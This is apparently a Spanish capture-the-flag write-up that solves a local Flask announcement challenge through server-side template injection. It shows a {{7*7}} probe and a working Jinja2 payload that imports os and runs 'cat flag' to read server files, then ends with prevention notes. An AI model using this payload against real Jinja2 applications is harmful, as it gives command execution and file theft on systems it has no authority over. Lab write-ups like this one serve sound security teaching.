## Descripción
I built a cool website that lets you announce whatever you want! Can you find the flag?
`http://localhost:3224`

## Solución
- Accedemos a la página web del reto en `http://localhost:3224/`, donde encontramos un formulario con el campo `content` para publicar un anuncio
- Revisamos las cabeceras HTTP del servidor y vemos que la aplicación está construida con Python y Werkzeug/Flask:
  ```http
  server: Werkzeug/3.0.3 Python/3.12.3
  ```
- Para verificar si la aplicación es vulnerable a Server-Side Template Injection (SSTI), enviamos una expresión aritmética en la plantilla:
  ```text
  {{ 7*7 }}
  ```
- Al enviar el formulario y seguir la redirección a `/announce`, la página muestra el resultado evaluado: `49`. Esto confirma que el servidor concatena la entrada directamente en el motor de plantillas (Jinja2)
- Usamos la introspección de objetos en Python mediante Jinja2 para acceder al módulo `os` y leer el archivo donde reside la bandera:
  ```jinja2
  {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
  ```
- Al procesar la plantilla, el servidor ejecuta la lectura del archivo `flag` e imprime el contenido en pantalla

```text
academy{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_5f46e534}
```

## Notas Adicionales
- **Server-Side Template Injection (SSTI)**: Surge cuando los datos suministrados por el usuario se concatenan directamente en la plantilla en lugar de pasarse como parámetros o variables de contexto al motor de renderizado (e.g. `render_template_string` en lugar de `render_template`).
- **Navegación por el árbol de objetos en Jinja2**: En Jinja2, acceder a `self.__init__.__globals__` permite alcanzar el espacio de nombres global del módulo actual, desde donde se puede invocar `__builtins__.__import__('os')` para interactuar con el sistema operativo y leer archivos.
- **Prevención**:
  - Evitar el uso de `render_template_string` con entradas dinámicas del usuario.
  - Separar completamente la lógica de la plantilla de los datos de usuario pasándolos como variables (`render_template("index.html", content=content)`).

## Referencias
- [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - Jinja2 SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
- [OWASP - Testing for Server-Side Template Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-Side_Template_Injection)